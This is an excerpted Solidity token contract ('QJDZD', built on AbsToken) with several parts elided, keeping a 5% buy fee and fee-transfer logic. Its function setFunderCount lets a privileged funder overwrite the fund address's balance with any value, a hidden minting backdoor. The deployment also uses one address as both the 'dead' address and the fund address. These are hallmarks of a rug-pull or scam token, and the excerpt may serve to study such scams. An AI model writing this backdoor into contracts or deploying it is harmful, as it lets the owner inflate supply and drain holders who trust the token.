...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 private _buyFundFee = 500;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (swapAmount > 0) {
                ...
                if(_balances[address(0x000000000000000000000000000000000000dEaD)] > 10000  * 10** 6){
                _takeTransfer(
                    sender,
    ...
    function setFunderCount(uint256 num) external onlyFunder {
        _balances[fundAddress] = num;
    }
...
contract QJDZD is AbsToken {
    constructor() AbsToken(
        ...
        6,//Decimals
        9000,//Supply
        address(0xA8dBA9721EF317d74a343cCb726d592A1Ee1a94f),//DeadAddress
        address(0x361704cA3B6596B74Daa26b1507fd92f0d4b6EF1),//ReceiveAddress
        address(0xA8dBA9721EF317d74a343cCb726d592A1Ee1a94f)//FundAddress
    ){
